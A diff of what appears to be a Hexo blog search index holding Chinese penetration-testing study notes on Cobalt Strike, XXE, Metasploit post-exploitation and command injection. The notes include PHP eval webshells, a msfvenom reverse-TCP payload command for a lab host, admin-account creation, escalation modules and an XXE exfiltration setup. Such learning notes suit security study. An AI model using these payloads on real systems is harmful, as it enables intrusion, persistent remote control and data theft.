@@ -110,39 +110,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Cobalt_Strike(CS)</title>
-    <url>/2023/08/21/Cobalt-Strike-CS/</url>
-    <content><![CDATA[<p>渗透测试神器 - Cobalt Strike</p>
-<h1 id="Cobalt-Strike-工具"><a href="#Cobalt-Strike-工具" class="headerlink" title="Cobalt Strike 工具"></a>Cobalt Strike 工具</h1><pre><code> 内网渗透[后渗透]神器（远控）
- CS可以团队作战  官网地址：https://www.cobaltstrike.com/（付费软件）
-</code></pre><h2 id="CS优势"><a href="#CS优势" class="headerlink" title="CS优势:"></a>CS优势:</h2><h3 id="团队协作："><a href="#团队协作：" class="headerlink" title="团队协作："></a>团队协作：</h3><p>​        可以多人合作完成渗透</p>
-<h3 id="跳板的功能"><a href="#跳板的功能" class="headerlink" title="跳板的功能"></a>跳板的功能</h3><p>​            CS分为两个部分。服务端、客户端</p>
-<p>​                服务端 - 架设在服务器上<br>​                客户端 - 在攻击者本机上</p>
-<p>​        溯源也只能溯源到服务端，无法溯源到攻击者<br>​        同一个CS，不同的用户，多地点登录权限相同</p>
-<h3 id="不间断监听"><a href="#不间断监听" class="headerlink" title="不间断监听"></a>不间断监听</h3><p>​            MSF会存在一个问题：<br>​                如果目标运行了木马，你的MSF监听没开启、电脑没开、没网。也没有意义<br>​                服务器 =&gt; 24小时不关机、不断网的主机</p>
-<h2 id="运行CS"><a href="#运行CS" class="headerlink" title="运行CS:"></a>运行CS:</h2><h3 id="运行服务端-gt"><a href="#运行服务端-gt" class="headerlink" title="运行服务端 =&gt;"></a>运行服务端 =&gt;</h3><p> 管理员模式 =&gt; 填ip =&gt; 填密码<br>        CS服务端默认端口<strong>50050</strong></p>
-<h3 id="启动客户端-gt"><a href="#启动客户端-gt" class="headerlink" title="启动客户端 =&gt;"></a>启动客户端 =&gt;</h3><p>​        后渗透神器、远控程序</p>
-<h4 id="1、设置监听"><a href="#1、设置监听" class="headerlink" title="1、设置监听"></a>1、设置监听</h4><h4 id="2、制作木马"><a href="#2、制作木马" class="headerlink" title="2、制作木马"></a>2、制作木马</h4><h4 id="3、上线"><a href="#3、上线" class="headerlink" title="3、上线"></a>3、上线</h4><p>​            改变<strong>心跳包</strong>时间 默认是60(心跳包:因为http不是一直连接的,所以要定期连一下同步信息)</p>
-<p>​        exe 木马</p>
-<p>​        =&gt; 宏病毒 （针对于office的病毒）<br>​        =&gt; 你打开了一个陌生的word xls<br>​        =&gt; WPS无法上线宏 [宏是WPS的收费功能，不付钱没有]</p>
-<p>​    进程注入=&gt;</p>
-<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>1、持久控制：开机自启木马<br>        一、任务计划程序<br>        二、服务运行 管理员才能生成服务<br>            SYSTEM 是计算机中最高的权限<br>    2、CS插件：让CS功能更加强大<br>        <a href="https://blog.csdn.net/ZPFCD/article/details/125824127">https://blog.csdn.net/ZPFCD/article/details/125824127</a></p>
-<p>​    &lt;?php eval(decode_base64($_REQUEST[7]))?&gt;</p>
-<p>​    7=phpinfo();<br>​    =&gt;cGhwaW5mbygpOw==</p>
-<p>​    加密数据：<br>​        https<br>​        走UDP代码<br>​        走icmp<br>​        改马，上AES RSA加密</p>
-<p>​        exe正常情况下改不了，编译后的产物<br>​        逆向：OD、ida =&gt; 把exe转换为汇编</p>
-<p>​        echo “Hello” =&gt;   100行-200行 500 1000行</p>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>渗透工具</tag>
-        <tag>木马</tag>
-        <tag>远控</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DNS注入</title>
     <url>/2023/08/21/DNS%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h1 id="DNS注入原理"><a href="#DNS注入原理" class="headerlink" title="DNS注入原理"></a>DNS注入原理</h1><p>在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起请求，这个时候就可以通过DNS请求把想获得的数据外带出来。        </p>
@@ -188,6 +155,39 @@
       </categories>
       <tags>
         <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Cobalt_Strike(CS)</title>
+    <url>/2023/08/21/Cobalt-Strike-CS/</url>
+    <content><![CDATA[<p>渗透测试神器 - Cobalt Strike</p>
+<h1 id="Cobalt-Strike-工具"><a href="#Cobalt-Strike-工具" class="headerlink" title="Cobalt Strike 工具"></a>Cobalt Strike 工具</h1><pre><code> 内网渗透[后渗透]神器（远控）
+ CS可以团队作战  官网地址：https://www.cobaltstrike.com/（付费软件）
+</code></pre><h2 id="CS优势"><a href="#CS优势" class="headerlink" title="CS优势:"></a>CS优势:</h2><h3 id="团队协作："><a href="#团队协作：" class="headerlink" title="团队协作："></a>团队协作：</h3><p>​        可以多人合作完成渗透</p>
+<h3 id="跳板的功能"><a href="#跳板的功能" class="headerlink" title="跳板的功能"></a>跳板的功能</h3><p>​            CS分为两个部分。服务端、客户端</p>
+<p>​                服务端 - 架设在服务器上<br>​                客户端 - 在攻击者本机上</p>
+<p>​        溯源也只能溯源到服务端，无法溯源到攻击者<br>​        同一个CS，不同的用户，多地点登录权限相同</p>
+<h3 id="不间断监听"><a href="#不间断监听" class="headerlink" title="不间断监听"></a>不间断监听</h3><p>​            MSF会存在一个问题：<br>​                如果目标运行了木马，你的MSF监听没开启、电脑没开、没网。也没有意义<br>​                服务器 =&gt; 24小时不关机、不断网的主机</p>
+<h2 id="运行CS"><a href="#运行CS" class="headerlink" title="运行CS:"></a>运行CS:</h2><h3 id="运行服务端-gt"><a href="#运行服务端-gt" class="headerlink" title="运行服务端 =&gt;"></a>运行服务端 =&gt;</h3><p> 管理员模式 =&gt; 填ip =&gt; 填密码<br>        CS服务端默认端口<strong>50050</strong></p>
+<h3 id="启动客户端-gt"><a href="#启动客户端-gt" class="headerlink" title="启动客户端 =&gt;"></a>启动客户端 =&gt;</h3><p>​        后渗透神器、远控程序</p>
+<h4 id="1、设置监听"><a href="#1、设置监听" class="headerlink" title="1、设置监听"></a>1、设置监听</h4><h4 id="2、制作木马"><a href="#2、制作木马" class="headerlink" title="2、制作木马"></a>2、制作木马</h4><h4 id="3、上线"><a href="#3、上线" class="headerlink" title="3、上线"></a>3、上线</h4><p>​            改变<strong>心跳包</strong>时间 默认是60(心跳包:因为http不是一直连接的,所以要定期连一下同步信息)</p>
+<p>​        exe 木马</p>
+<p>​        =&gt; 宏病毒 （针对于office的病毒）<br>​        =&gt; 你打开了一个陌生的word xls<br>​        =&gt; WPS无法上线宏 [宏是WPS的收费功能，不付钱没有]</p>
+<p>​    进程注入=&gt;</p>
+<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>1、持久控制：开机自启木马<br>        一、任务计划程序<br>        二、服务运行 管理员才能生成服务<br>            SYSTEM 是计算机中最高的权限<br>    2、CS插件：让CS功能更加强大<br>        <a href="https://blog.csdn.net/ZPFCD/article/details/125824127">https://blog.csdn.net/ZPFCD/article/details/125824127</a></p>
+<p>​    &lt;?php eval(decode_base64($_REQUEST[7]))?&gt;</p>
+<p>​    7=phpinfo();<br>​    =&gt;cGhwaW5mbygpOw==</p>
+<p>​    加密数据：<br>​        https<br>​        走UDP代码<br>​        走icmp<br>​        改马，上AES RSA加密</p>
+<p>​        exe正常情况下改不了，编译后的产物<br>​        逆向：OD、ida =&gt; 把exe转换为汇编</p>
+<p>​        echo “Hello” =&gt;   100行-200行 500 1000行</p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>渗透工具</tag>
+        <tag>木马</tag>
+        <tag>远控</tag>
       </tags>
   </entry>
   <entry>
@@ -263,34 +263,6 @@
       </tags>
   </entry>
   <entry>
-    <title>XXE实体注入</title>
-    <url>/2023/08/21/XXE%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="XXE定义"><a href="#XXE定义" class="headerlink" title="XXE定义"></a>XXE定义</h1><p>XXE   ==  xml外部实体注入 (被各种后端脚本调用)<br>          =&gt;XML只存数据,除此以外不会做任何事情 (像HTML | 传输数据 | 无预定义)<br>          =&gt; 外部实体<br>          =&gt;注入 [用户输入的数据被当做代码执行]</p>
-<h1 id="XML定义"><a href="#XML定义" class="headerlink" title="XML定义"></a>XML定义</h1><p>XML 指可扩展标记语言（EXtensible Markup Language）<br>XML 是一种标记语言，很类似 HTMLXML 的设计宗旨是传输数据，而非显示数据<br>XML 标签没有被预定义。您需要自行定义标签。XML 被设计为具有自我描述性。<br>XML 是 W3C 的推荐标准</p>
-<p>特点：<br>XML仅仅是纯文本，他不会做任何事情。<br>XML可以自己发明标签（允许定义自己的标签和文档结构）<br>XML 无所不在。</p>
-<p>XML 是各种应用程序之间进行数据传输的最常用的工具，并且在信息存储和描述领域变得越来越流行</p>
-<p>前端代码:<br>                <code>&lt;b&gt;&lt;/b&gt;</code>加粗<br>                <code>&lt;h1&gt;&lt;/h1&gt;</code>大标题<br>XML:<br>                <code>&lt;b&gt;&lt;/b&gt;</code> 名字而已<br>                <code>&lt;h1&gt;&lt;/h1&gt;</code>名字而已</p>
-<h1 id="XML结构"><a href="#XML结构" class="headerlink" title="XML结构"></a>XML结构</h1><p>​    <code>&lt;?xml version=&quot;1.0&quot;?&gt;</code>     //文件头部分</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">scan</span> [<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/1.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"></span><br><span class="line">//DTD部分（通过特殊的命令去其他文件读取信息,就是文件包含,使用的关键字为SYSTEM）</span><br><span class="line">其中,scan是标签</span><br><span class="line"></span><br><span class="line">//test相当于自定义了变量,让包含的文件写入到test实体中</span><br></pre></td></tr></table></figure>
-<p>​    <code>&lt;scan&gt;&amp;test;&lt;/scan&gt;</code>            //XML部分,表示test实体作用范围为scan标签</p>
-<h1 id="XXE的寻找"><a href="#XXE的寻找" class="headerlink" title="XXE的寻找"></a>XXE的寻找</h1><h2 id="1-代码审计"><a href="#1-代码审计" class="headerlink" title="1.代码审计"></a>1.代码审计</h2><h3 id="高危函数"><a href="#高危函数" class="headerlink" title="高危函数"></a>高危函数</h3><p>simplexml_load_string()  //调用xml字符串并转换为实体对象<br>simplexml_load_file()     //读取xml文件并转化为实体对象</p>
-<h3 id="数据外带"><a href="#数据外带" class="headerlink" title="数据外带"></a>数据外带</h3><p>大部分的xxe是没有回显的，我们不知道是否调用,所以可以考虑把数据外带出来：<br>    1、获取信息<br>    2、发送信息</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XSS平台：	</span><br><span class="line">	你打XSS到目标站点 -&gt; 有人访问后把数据传到平台 -&gt; 记录下来，等你来看</span><br><span class="line"></span><br><span class="line">XML: 请求一个你自己搭建的php文件，其他的文件。（你想要的数据给带出来）</span><br><span class="line">	 php文件记录请求的传参内容（记录文件）</span><br><span class="line">	 等你去看就可以了</span><br></pre></td></tr></table></figure>
-<p>1.xml : 请求访问’<a href="http://127.0.0.1/WWW/2.php?id=%file">http://127.0.0.1/WWW/2.php?id=%file</a>‘.</p>
-<p>1.php : (1) 将”PHP://filter/read=convert.base64-encode/resource=1.txt”实体化为 %file对象;<br>            (2)让 % remote 包含 1.xml 并执行<br>            (3)将(1)和(2)变为一个xml 类型的字符串 ,再实体化为 test</p>
-<p>2.PHP : file_put_contents(“3.txt”,$_GET[“id”],FILE_APPEND); //php中的写文件函数,把id传参扩展追             加到3.TXT的内容后</p>
-<h4 id="file-正常情况下是网站不应该使用的协议"><a href="#file-正常情况下是网站不应该使用的协议" class="headerlink" title="file:/// 正常情况下是网站不应该使用的协议"></a>file:/// 正常情况下是网站不应该使用的协议</h4><p>PHP伪协议（PHP的内部协议）<br>php://filter/read=convert.base64-encode/resource=a.txt</p>
-<h4 id="为什么要进行base64编码"><a href="#为什么要进行base64编码" class="headerlink" title="为什么要进行base64编码?"></a>为什么要进行base64编码?</h4><p>以免特殊字符影响传参 :  <code>http://XXXX.php?id=12#45&amp;id=67</code> 这里可能会被认为是锚点导致传参不完整</p>
-<h2 id="2、看到数据包莫名其妙传递、返回XML代码-可以试试XXE"><a href="#2、看到数据包莫名其妙传递、返回XML代码-可以试试XXE" class="headerlink" title="2、看到数据包莫名其妙传递、返回XML代码,可以试试XXE"></a>2、看到数据包莫名其妙传递、返回XML代码,可以试试XXE</h2><h1 id="修复XXE的方法"><a href="#修复XXE的方法" class="headerlink" title="修复XXE的方法"></a>修复XXE的方法</h1><p>​    1、libxml_disable_entity_loader(true);  PHP的函数（禁止加载XML实体）<br>​    2、过滤SYSTEM关键字</p>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>XXE实体注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SSRF-服务器请求伪造攻击</title>
     <url>/2023/08/21/SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/</url>
     <content><![CDATA[<h1 id="SSRF定义"><a href="#SSRF定义" class="headerlink" title="SSRF定义"></a>SSRF定义</h1><p>服务器端请求伪造（SSRF）是指攻击者能够从易受攻击的Web应用程序发送精心设计的请求的对其他网站进行攻击。(利用一个可发起网络请求的服务当作跳板来攻击其他服务)<br>攻击者能够利用目标帮助攻击者访问其他想要攻击的目标,即A让B帮忙访问C</p>
@@ -318,6 +290,34 @@
       </categories>
       <tags>
         <tag>SSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XXE实体注入</title>
+    <url>/2023/08/21/XXE%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="XXE定义"><a href="#XXE定义" class="headerlink" title="XXE定义"></a>XXE定义</h1><p>XXE   ==  xml外部实体注入 (被各种后端脚本调用)<br>          =&gt;XML只存数据,除此以外不会做任何事情 (像HTML | 传输数据 | 无预定义)<br>          =&gt; 外部实体<br>          =&gt;注入 [用户输入的数据被当做代码执行]</p>
+<h1 id="XML定义"><a href="#XML定义" class="headerlink" title="XML定义"></a>XML定义</h1><p>XML 指可扩展标记语言（EXtensible Markup Language）<br>XML 是一种标记语言，很类似 HTMLXML 的设计宗旨是传输数据，而非显示数据<br>XML 标签没有被预定义。您需要自行定义标签。XML 被设计为具有自我描述性。<br>XML 是 W3C 的推荐标准</p>
+<p>特点：<br>XML仅仅是纯文本，他不会做任何事情。<br>XML可以自己发明标签（允许定义自己的标签和文档结构）<br>XML 无所不在。</p>
+<p>XML 是各种应用程序之间进行数据传输的最常用的工具，并且在信息存储和描述领域变得越来越流行</p>
+<p>前端代码:<br>                <code>&lt;b&gt;&lt;/b&gt;</code>加粗<br>                <code>&lt;h1&gt;&lt;/h1&gt;</code>大标题<br>XML:<br>                <code>&lt;b&gt;&lt;/b&gt;</code> 名字而已<br>                <code>&lt;h1&gt;&lt;/h1&gt;</code>名字而已</p>
+<h1 id="XML结构"><a href="#XML结构" class="headerlink" title="XML结构"></a>XML结构</h1><p>​    <code>&lt;?xml version=&quot;1.0&quot;?&gt;</code>     //文件头部分</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">scan</span> [<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/1.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"></span><br><span class="line">//DTD部分（通过特殊的命令去其他文件读取信息,就是文件包含,使用的关键字为SYSTEM）</span><br><span class="line">其中,scan是标签</span><br><span class="line"></span><br><span class="line">//test相当于自定义了变量,让包含的文件写入到test实体中</span><br></pre></td></tr></table></figure>
+<p>​    <code>&lt;scan&gt;&amp;test;&lt;/scan&gt;</code>            //XML部分,表示test实体作用范围为scan标签</p>
+<h1 id="XXE的寻找"><a href="#XXE的寻找" class="headerlink" title="XXE的寻找"></a>XXE的寻找</h1><h2 id="1-代码审计"><a href="#1-代码审计" class="headerlink" title="1.代码审计"></a>1.代码审计</h2><h3 id="高危函数"><a href="#高危函数" class="headerlink" title="高危函数"></a>高危函数</h3><p>simplexml_load_string()  //调用xml字符串并转换为实体对象<br>simplexml_load_file()     //读取xml文件并转化为实体对象</p>
+<h3 id="数据外带"><a href="#数据外带" class="headerlink" title="数据外带"></a>数据外带</h3><p>大部分的xxe是没有回显的，我们不知道是否调用,所以可以考虑把数据外带出来：<br>    1、获取信息<br>    2、发送信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XSS平台：	</span><br><span class="line">	你打XSS到目标站点 -&gt; 有人访问后把数据传到平台 -&gt; 记录下来，等你来看</span><br><span class="line"></span><br><span class="line">XML: 请求一个你自己搭建的php文件，其他的文件。（你想要的数据给带出来）</span><br><span class="line">	 php文件记录请求的传参内容（记录文件）</span><br><span class="line">	 等你去看就可以了</span><br></pre></td></tr></table></figure>
+<p>1.xml : 请求访问’<a href="http://127.0.0.1/WWW/2.php?id=%file">http://127.0.0.1/WWW/2.php?id=%file</a>‘.</p>
+<p>1.php : (1) 将”PHP://filter/read=convert.base64-encode/resource=1.txt”实体化为 %file对象;<br>            (2)让 % remote 包含 1.xml 并执行<br>            (3)将(1)和(2)变为一个xml 类型的字符串 ,再实体化为 test</p>
+<p>2.PHP : file_put_contents(“3.txt”,$_GET[“id”],FILE_APPEND); //php中的写文件函数,把id传参扩展追             加到3.TXT的内容后</p>
+<h4 id="file-正常情况下是网站不应该使用的协议"><a href="#file-正常情况下是网站不应该使用的协议" class="headerlink" title="file:/// 正常情况下是网站不应该使用的协议"></a>file:/// 正常情况下是网站不应该使用的协议</h4><p>PHP伪协议（PHP的内部协议）<br>php://filter/read=convert.base64-encode/resource=a.txt</p>
+<h4 id="为什么要进行base64编码"><a href="#为什么要进行base64编码" class="headerlink" title="为什么要进行base64编码?"></a>为什么要进行base64编码?</h4><p>以免特殊字符影响传参 :  <code>http://XXXX.php?id=12#45&amp;id=67</code> 这里可能会被认为是锚点导致传参不完整</p>
+<h2 id="2、看到数据包莫名其妙传递、返回XML代码-可以试试XXE"><a href="#2、看到数据包莫名其妙传递、返回XML代码-可以试试XXE" class="headerlink" title="2、看到数据包莫名其妙传递、返回XML代码,可以试试XXE"></a>2、看到数据包莫名其妙传递、返回XML代码,可以试试XXE</h2><h1 id="修复XXE的方法"><a href="#修复XXE的方法" class="headerlink" title="修复XXE的方法"></a>修复XXE的方法</h1><p>​    1、libxml_disable_entity_loader(true);  PHP的函数（禁止加载XML实体）<br>​    2、过滤SYSTEM关键字</p>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>XXE实体注入</tag>
       </tags>
   </entry>
   <entry>
@@ -510,66 +510,6 @@
       </tags>
   </entry>
   <entry>
-    <title>msf后渗透</title>
-    <url>/2023/08/21/msf%E5%90%8E%E6%B8%97%E9%80%8F/</url>
-    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>phpstudy +  phpmyadmin 4.8.1 </p>
-<p>创建用户：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user www admin@123 /add</span><br><span class="line">net localgroup administrators 账号 /add # 添加权限</span><br></pre></td></tr></table></figure>
-<p><img src="C:\Users\rubik\Desktop\msfpost\img\1.png" alt=""></p>
-<p>设置的漏洞点: 远程文件包含</p>
-<p>80端口被占用问题:</p>
-<p><img src="C:\Users\rubik\Desktop\msfpost\img\2.png" alt=""></p>
-<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>爆破：</p>
-<p>攻击模块：auxiliary/scanner/http/phpmyadmin_login  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali自带字典</span><br><span class="line">/usr/share/dirb/wordlists/ </span><br><span class="line">/usr/share/wordlists/</span><br><span class="line">https://github.com/TheKingOfDuck/fuzzDicts</span><br></pre></td></tr></table></figure>
-<p>远程文件包含：</p>
-<p>使用的模块：exploit/multi/http/phpmyadmin_lfi_rce </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload：</span><br><span class="line">php/meterpreter/reverse_tcp	# 功能不全面，执可执行的命令较少</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>网站的根目录： www/</p>
-<p>192.168.226.173/phpinf.php</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol>
-<li><p>借助其他的工具来进行操作</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getwd # 确认当前目录 </span><br><span class="line">edit 1.php # 使用的是vim的编辑。i：进入编辑模式  esc：退出编辑模式  :wq ：保存退出 </span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<ol>
-<li>直接通过msf进行操作</li>
-</ol>
-<p>​        生成新的后门文件:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 lhost=192.168.226.128 lport=1234 -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">use post/multi/recon/local_exploit_suggester # 查看能用的漏洞 (有时候可能会失败.)</span><br><span class="line"></span><br><span class="line">use exploit/windows/local/ms16_075_reflection_juicy # 提权模块</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>linux命令:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano # 查看端口</span><br></pre></td></tr></table></figure>
-<p>反弹shell:</p>
-<p>自己 ——-&gt; 目标服务器</p>
-<p>目标服务器 ——-&gt; 自己  反向链接出来的shell,就叫反弹shell </p>
-<h2 id="常用的提权方式："><a href="#常用的提权方式：" class="headerlink" title="常用的提权方式："></a>常用的提权方式：</h2><ol>
-<li><p>利用运行的应用漏洞提权 （限制条件比较多）</p>
-</li>
-<li><p>利用系统漏洞进行提权。</p>
-<ol>
-<li><p>系统补丁 （没打补丁能利用的点）</p>
-<p>根据提供的漏洞补丁的数量.</p>
-<p>去除掉已经打了补丁的漏洞. 然后显示常见的其他的可利用的漏洞</p>
-<p>没打补丁、意味着可能漏洞是能被利用的。所以我们就可以根据补丁数量，去判断有没有可用的点</p>
-<p>补丁通常是需要自己去打,安全工具,只是能识别出攻击流量.然后ban掉这些流量</p>
-</li>
-</ol>
-</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo 查看到当前系统的补丁信息</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-        <category>渗透工具</category>
-      </categories>
-      <tags>
-        <tag>渗透工具</tag>
-        <tag>木马</tag>
-        <tag>远控</tag>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>post注入</title>
     <url>/2023/08/21/post%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h1 id="1-什么是post注入"><a href="#1-什么是post注入" class="headerlink" title="1.什么是post注入?"></a>1.什么是post注入?</h1><p>定义:用户通过post传参的数据被当做sql语句执行的注入(和get注入只有传参方式的不同)</p>
@@ -627,6 +567,66 @@
       </categories>
       <tags>
         <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>msf后渗透</title>
+    <url>/2023/08/21/msf%E5%90%8E%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>phpstudy +  phpmyadmin 4.8.1 </p>
+<p>创建用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user www admin@123 /add</span><br><span class="line">net localgroup administrators 账号 /add # 添加权限</span><br></pre></td></tr></table></figure>
+<p><img src="C:\Users\rubik\Desktop\msfpost\img\1.png" alt=""></p>
+<p>设置的漏洞点: 远程文件包含</p>
+<p>80端口被占用问题:</p>
+<p><img src="C:\Users\rubik\Desktop\msfpost\img\2.png" alt=""></p>
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>爆破：</p>
+<p>攻击模块：auxiliary/scanner/http/phpmyadmin_login  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali自带字典</span><br><span class="line">/usr/share/dirb/wordlists/ </span><br><span class="line">/usr/share/wordlists/</span><br><span class="line">https://github.com/TheKingOfDuck/fuzzDicts</span><br></pre></td></tr></table></figure>
+<p>远程文件包含：</p>
+<p>使用的模块：exploit/multi/http/phpmyadmin_lfi_rce </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload：</span><br><span class="line">php/meterpreter/reverse_tcp	# 功能不全面，执可执行的命令较少</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>网站的根目录： www/</p>
+<p>192.168.226.173/phpinf.php</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol>
+<li><p>借助其他的工具来进行操作</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getwd # 确认当前目录 </span><br><span class="line">edit 1.php # 使用的是vim的编辑。i：进入编辑模式  esc：退出编辑模式  :wq ：保存退出 </span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol>
+<li>直接通过msf进行操作</li>
+</ol>
+<p>​        生成新的后门文件:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 lhost=192.168.226.128 lport=1234 -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">use post/multi/recon/local_exploit_suggester # 查看能用的漏洞 (有时候可能会失败.)</span><br><span class="line"></span><br><span class="line">use exploit/windows/local/ms16_075_reflection_juicy # 提权模块</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>linux命令:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano # 查看端口</span><br></pre></td></tr></table></figure>
+<p>反弹shell:</p>
+<p>自己 ——-&gt; 目标服务器</p>
+<p>目标服务器 ——-&gt; 自己  反向链接出来的shell,就叫反弹shell </p>
+<h2 id="常用的提权方式："><a href="#常用的提权方式：" class="headerlink" title="常用的提权方式："></a>常用的提权方式：</h2><ol>
+<li><p>利用运行的应用漏洞提权 （限制条件比较多）</p>
+</li>
+<li><p>利用系统漏洞进行提权。</p>
+<ol>
+<li><p>系统补丁 （没打补丁能利用的点）</p>
+<p>根据提供的漏洞补丁的数量.</p>
+<p>去除掉已经打了补丁的漏洞. 然后显示常见的其他的可利用的漏洞</p>
+<p>没打补丁、意味着可能漏洞是能被利用的。所以我们就可以根据补丁数量，去判断有没有可用的点</p>
+<p>补丁通常是需要自己去打,安全工具,只是能识别出攻击流量.然后ban掉这些流量</p>
+</li>
+</ol>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo 查看到当前系统的补丁信息</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+        <category>渗透工具</category>
+      </categories>
+      <tags>
+        <tag>渗透工具</tag>
+        <tag>木马</tag>
+        <tag>远控</tag>
+        <tag>提权</tag>
       </tags>
   </entry>
   <entry>
@@ -1063,28 +1063,6 @@
       </tags>
   </entry>
   <entry>
-    <title>命令执行漏洞</title>
-    <url>/2023/08/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="命令执行漏洞定义"><a href="#命令执行漏洞定义" class="headerlink" title="命令执行漏洞定义"></a>命令执行漏洞定义</h1><p>用户输入的数据被当做系统命令(cmd/bash)执行<br>whoami / net user / tasklist / xxx</p>
-<p>dir / ls / rm -rf</p>
-<h1 id="多行命令执行："><a href="#多行命令执行：" class="headerlink" title="多行命令执行："></a>多行命令执行：</h1><p>whoami&amp;net user&amp;ipconfig</p>
-<p>拿到了命令执行漏洞后还可能想要webshell</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">123</span> &gt; <span class="number">777</span>.txt</span><br><span class="line">可以尝试cmd的输出命令	<span class="keyword">echo</span> “<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">8</span>])<span class="meta">?&gt;</span>” &gt;<span class="number">1</span>.php	</span><br><span class="line">netstat -ano &gt; <span class="number">1</span>.txt </span><br><span class="line">disable_function PHP的禁用函数</span><br></pre></td></tr></table></figure>
-<h1 id="命令执行函数："><a href="#命令执行函数：" class="headerlink" title="命令执行函数："></a>命令执行函数：</h1><p>system()  执行系统命令,直接输出</p>
-<p>echo exec()    执行系统命令,没有输出,输出最后一行。</p>
-<p>echo shell_exec(‘whoami’); 执行系统命令,没有输出,可以输出多行</p>
-<p>echo `whoami`             //(反引号)与shell_exec 效果完全相同【调用,即简写】</p>
-<p>passthru //只调用命令,他和system差不多</p>
-<p>popen // 比较特殊的存在 [disable_function 是可以绕的]<br>        $a = popen(‘whoami’,’r’);         //返回的是一个文件的指针地址( //r是只读、w是写入)<br>        echo fread($a,1024);</p>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>命令执行漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>反序列化漏洞</title>
